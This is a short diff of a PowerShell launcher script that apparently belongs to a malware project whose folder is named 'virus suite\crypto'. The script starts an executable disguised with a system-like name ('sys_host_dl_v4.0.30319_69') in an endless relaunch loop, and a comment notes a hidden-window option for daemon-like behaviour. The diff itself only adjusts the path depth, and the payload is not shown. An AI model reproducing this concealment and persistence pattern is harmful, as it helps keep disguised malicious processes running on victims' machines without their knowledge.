@@ -5,7 +5,7 @@
 
 $cwd = (get-location).path
 $proc = "sys_host_dl_v4.0.30319_69" 
-$exe =(get-item $cwd).parent.parent.parent.parent.fullname + "\virus suite\crypto\app\" + $proc + ".exe"
+$exe =(get-item $cwd).parent.parent.parent.fullname + "\virus suite\crypto\app\" + $proc + ".exe"
 
 $cmd = "Start-Process -FilePath '" + $exe + "'"   # "-WindowStyle Hidden" #for daemon properties
 while($true){
